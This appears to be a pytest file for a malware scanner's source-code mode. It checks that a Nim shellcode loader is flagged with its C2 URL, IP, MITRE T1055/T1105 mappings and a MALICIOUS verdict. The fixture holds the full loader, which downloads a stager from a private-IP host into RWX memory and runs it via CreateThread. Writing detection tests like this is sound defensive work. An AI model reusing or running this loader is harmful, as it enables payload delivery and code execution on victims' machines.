"""Source-code analysis mode — verify the file scanner switches off
PE/binary patterns when handed a source file and instead surfaces
language-specific tradecraft.

Reproducer: the Nim shellcode loader (`custom_load.nim`) pasted into the
RECON file scanner — VirtualAlloc(PAGE_EXECUTE_READWRITE) + CreateThread
+ httpclient.downloadFile to an attacker-hosted stager URL. The expected
behaviour:

  * file_type == "source_code", language tagged as Nim
  * the C2 URL appears in iocs.urls
  * the IP appears in iocs.ips
  * T1055 (shellcode injection) and T1105 (dropper) both map
  * capability assessment verdict is MALICIOUS
  * overall file verdict is MALICIOUS
"""

import os
import sys

import pytest


_BACKEND = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _BACKEND not in sys.path:
    sys.path.insert(0, _BACKEND)

from intel.file_analyzer import analyze_file  # noqa: E402


# Real Nim source file — combination of httpclient + winim + VirtualAlloc
# RWX + CreateThread is the textbook shellcode-loader build seen in
# off-the-shelf commodity loaders (and red-team training samples). Trimmed
# to the analytical core; comments preserved because the source patterns
# match against the joined string corpus.
_NIM_LOADER = b"""# To compile and run nim c -r custom_load.nim
import std/httpclient
import winim

# Function to download the stager
proc downloadRemoteFile() =
  var client = newHttpClient()
  let url = "http://192.168.174.128:4443/screenconnect/id?=64545"
  let filePath = "C:\\\\Users\\\\ToddGunn\\\\Desktop\\\\stager.bin"
  try:
    client.downloadFile(url, filePath)
    echo "Download completed successfully."
  except:
    echo "Error occurred while downloading the file."
  finally:
    client.close()

downloadRemoteFile()

proc bintobyte(filename: string): seq[byte] =
  var file = readFile(filename)
  result = newSeq[byte](file.len)
  if file.len > 0:
    copyMem(addr result[0], addr file[0], file.len)

var myBytes = bintobyte("C:\\\\Users\\\\ToddGunn\\\\Desktop\\\\stager.bin")
echo "Read", myBytes.len, " bytes from file."

var mem = VirtualAlloc(NULL, cast[SIZE_T](myBytes.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
GetLastError()
copyMem(mem, addr(myBytes[0]), cast[SIZE_T](myBytes.len))

var thread_handle = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](mem), NULL, 0, NULL)

echo "SUCCESS"
WaitForSingleObject(thread_handle, -1)
CloseHandle(thread_handle)
"""


@pytest.fixture(scope="module")
def nim_result():
    return analyze_file(_NIM_LOADER, "custom_load.nim")


def test_type_detected_as_source_code(nim_result):
    assert nim_result["file_type"] == "source_code"
    assert nim_result["type"]["is_source_code"] is True
    assert nim_result["type"]["source_language"] == "Nim"


def test_file_type_banner_present(nim_result):
    banner = nim_result.get("file_type_banner")
    assert banner is not None
    assert "Nim source code" in banner
    assert "static code analysis" in banner


def test_c2_url_extracted(nim_result):
    urls = nim_result.get("iocs", {}).get("urls") or []
    # The full stager URL (host + port + path) must be present.
    assert any("192.168.174.128:4443/screenconnect/id" in u for u in urls), \
        f"C2 URL missing from iocs.urls: {urls!r}"


def test_c2_ip_extracted(nim_result):
    ips = nim_result.get("iocs", {}).get("ips") or []
    assert "192.168.174.128" in ips, f"C2 IP missing from iocs.ips: {ips!r}"


def test_shellcode_injection_pattern_detected(nim_result):
    sus = {s["pattern"] for s in (nim_result.get("suspicious_strings") or [])}
    assert "src_virtualalloc_rwx" in sus
    assert "src_create_thread" in sus
    # Both must fire — that's what flips T1055.


def test_http_download_call_detected(nim_result):
    sus = {s["pattern"] for s in (nim_result.get("suspicious_strings") or [])}
    assert "src_http_download_call" in sus


def test_nim_winim_import_detected(nim_result):
    sus = {s["pattern"] for s in (nim_result.get("suspicious_strings") or [])}
    assert "src_nim_winim" in sus


def test_capability_mapping_includes_T1055(nim_result):
    techniques = (nim_result.get("capabilities") or {}).get("mitre_techniques") or []
    tids = {t["id"] for t in techniques}
    assert "T1055" in tids


def test_capability_mapping_includes_T1105_dropper(nim_result):
    techniques = (nim_result.get("capabilities") or {}).get("mitre_techniques") or []
    tids = {t["id"] for t in techniques}
    assert "T1105" in tids


def test_capability_verdict_is_malicious(nim_result):
    # T1055 + T1105 both fire → high-signal elevator promotes to MALICIOUS
    # without waiting for the >=5-technique threshold.
    assert (nim_result.get("capabilities") or {}).get("verdict") == "MALICIOUS"


def test_overall_verdict_is_malicious(nim_result):
    assert nim_result["verdict"] == "MALICIOUS"


def test_pe_imports_path_not_relied_on(nim_result):
    # We must reach MALICIOUS without any PE format_specific block — proof
    # that source-code mode does not fall back to PE-import predicates.
    fs = nim_result.get("format_specific") or {}
    assert not fs.get("pe"), (
        "source file analysis must not produce a PE format-specific block — "
        f"got {fs.get('pe')!r}"
    )


def test_plain_text_file_not_marked_as_source_when_no_signal():
    # Negative control: a printable-ASCII blob with no source-code signals
    # is still tagged file_type=source_code (it IS source-ish text) but
    # must produce no shellcode capabilities and no MALICIOUS verdict.
    plain = b"Hello world.\nThis is just notes.\nNothing actionable here.\n" * 20
    res = analyze_file(plain, "notes.txt")
    # No claimed source ext, content is plain-printable → source-code mode
    # with the generic "Source Code" language tag.
    assert res["file_type"] == "source_code"
    assert (res.get("capabilities") or {}).get("verdict") != "MALICIOUS"
    # No T1055 / T1105 should fire on harmless prose.
    tids = {t["id"] for t in (res.get("capabilities") or {}).get("mitre_techniques") or []}
    assert "T1055" not in tids
    assert "T1105" not in tids
